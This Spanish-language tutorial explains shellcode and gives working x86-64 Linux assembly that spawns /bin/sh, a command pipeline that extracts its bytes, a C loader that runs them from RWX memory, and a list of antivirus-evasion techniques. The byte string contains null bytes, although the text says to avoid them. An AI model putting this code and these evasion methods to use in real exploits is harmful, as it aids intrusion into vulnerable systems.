# Shellcodes

### 1. ¿Qué es un Shellcode?
Un **shellcode** es un fragmento de código en lenguaje ensamblador diseñado para ejecutarse dentro de un proceso objetivo. 
Se usa comúnmente en **exploits** para tomar el control de un sistema vulnerable.

Los shellcodes pueden ejecutarse en memoria sin necesidad de archivos, lo que los hace ideales para ataques como **buffer overflows** o **inyecciones de código**.

### 2. Tipos de Shellcodes
Existen diferentes tipos de shellcodes según el contexto de ataque:

- **Shellcodes de usuario**: Se ejecutan dentro de procesos de usuario sin privilegios elevados.
- **Shellcodes de kernel**: Se ejecutan en el espacio de kernel, lo que permite un control total del sistema.
- **Shellcodes conectados a red**:
  - **Reverse shell**: Se conecta a un servidor remoto y permite al atacante tomar el control.
  - **Bind shell**: Abre un puerto en la máquina víctima para que el atacante se conecte.

### 3. Características de un Shellcode
Un shellcode efectivo debe cumplir con los siguientes criterios:

- **Pequeño**: Minimiza el tamaño para encajar en buffers pequeños.
- **Autocontenido**: No depende de librerías externas.
- **Evasivo**: Evita caracteres nulos (`\x00`) y detección por antivirus.
- **Portable**: Funciona en múltiples versiones del sistema operativo objetivo.

### 4. Creación de un Shellcode
Para crear un shellcode, se usa ensamblador y luego se convierte en una cadena de bytes. Por ejemplo, un shellcode en **Linux** adaptado para **64 bits** que ejecuta `/bin/sh`:

```assembly
section .text
    global _start

_start:
    xor rax, rax         ; Limpia rax
    push rax             ; NULL terminator
    mov rdi, 0x68732f6e69622f2f ; "//bin/sh" en hexadecimal
    push rdi
    mov rdi, rsp         ; Apunta rdi a "/bin//sh"
    xor rsi, rsi         ; argv = NULL
    xor rdx, rdx         ; envp = NULL
    mov rax, 59          ; syscall execve (59 en 64 bits)
    syscall              ; Llamada al kernel
```
### 5. Conversión de Shellcode a Cadena de Bytes

Para convertir un shellcode en ensamblador a una cadena de bytes.

Primero ensamblamos el código:

```bash
nasm -f elf64 -o shellcode.o shellcode.asm
```

Luego, lo vinculamos y obtenemos el shellcode en formato hexadecimal con `objdump`:

```bash
ld -o shellcode shellcode.o
objdump -d shellcode | grep '[0-9a-f]:' | grep -o '\b[0-9a-f]\{2\}\b' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
```

Este comando genera una cadena de bytes que se puede inyectar en un programa.

### 6. Uso del Shellcode en C

Podemos probar el shellcode en un programa en C, comúnmente denominado **loader**:

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode[] = 
    "\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57"
    "\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05";

int main() {
    printf("Ejecutando shellcode...\n");

    // Obtener el tamaño del shellcode
    size_t shellcode_size = sizeof(shellcode);

    // Reservar memoria RWX con mmap
    void *exec_mem = mmap(NULL, shellcode_size, 
                          PROT_READ | PROT_WRITE | PROT_EXEC, 
                          MAP_ANON | MAP_PRIVATE, -1, 0);
    
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copiar el shellcode a la memoria ejecutable
    memcpy(exec_mem, shellcode, shellcode_size);

    // Ejecutar el shellcode
    ((void(*)())exec_mem)();

    return 0;
}
```

Se copia a un segmento de memoria asignado dinámicamente con mmap() porque las secciones donde normalmente se almacenan los datos en un programa suelen tener permisos de solo lectura o sin permisos de ejecución, lo que impediría la ejecución del código.

Además, mmap() permite reservar una región de memoria con permisos específicos, como lectura, escritura y ejecución (PROT_READ | PROT_WRITE | PROT_EXEC), asegurando que el código almacenado en ella pueda modificarse y ejecutarse sin restricciones impuestas por el sistema operativo.


Compilamos y ejecutamos:

```bash
gcc -o shellcode_exec shellcode.c -z execstack -no-pie
./shellcode_exec
```

Si se ejecuta correctamente, abrirá una shell interactiva.

### 7. Evasión de Detección

Para evitar detecciones, se pueden aplicar técnicas como:

- **Codificación XOR**: Para evitar bytes nulos y firmas conocidas.
- **Obfuscación**: Alterar el orden de instrucciones sin cambiar la funcionalidad.
- **Cifrado Polimórfico**: Utilizar decodificadores automáticos.
